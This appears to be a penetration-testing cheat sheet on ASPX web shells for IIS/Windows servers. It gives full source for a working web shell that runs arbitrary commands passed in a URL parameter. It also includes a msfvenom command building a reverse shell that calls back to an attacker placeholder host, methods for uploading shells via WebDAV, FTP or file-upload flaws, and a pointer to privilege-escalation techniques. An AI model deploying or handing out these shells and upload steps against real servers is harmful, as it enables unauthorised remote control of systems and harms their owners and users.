---
tags: [pentest, shells, webshell, aspx, iis, windows, initial-access, web]
type: cheatsheet
phase: 5
---
# ASPX Web Shells

Web shells for IIS / ASP.NET targets running on Windows.

[[00 - README|Folder index]]

## Minimal ASPX command execution

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (cmd != null) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

Usage: `http://target/shell.aspx?cmd=whoami`

## msfvenom ASPX reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
```

## Pre-built web shells

- **Kali**: `/usr/share/webshells/aspx/cmdasp.aspx`
- **Antak**: PowerShell web shell for IIS — full PS terminal in the browser

## Upload vectors

| Method | Details |
| --- | --- |
| File upload vulnerability | Upload `.aspx` directly |
| WebDAV (if enabled) | `cadaver http://target/` or `curl -T shell.aspx http://target/` |
| IIS shortname brute | Find existing `.aspx` files to overwrite |
| FTP to web root | If FTP maps to `C:\inetpub\wwwroot\` |

> [!tip] Check application pool identity
> ASPX shells run as the IIS application pool identity — often `IIS APPPOOL\DefaultAppPool` or `NT AUTHORITY\NETWORK SERVICE`. Check `whoami /priv` for SeImpersonatePrivilege (potato attacks).

## See also

- [[08 - PHP Web Shells]]
- [[09 - JSP Web Shells (Tomcat)]]
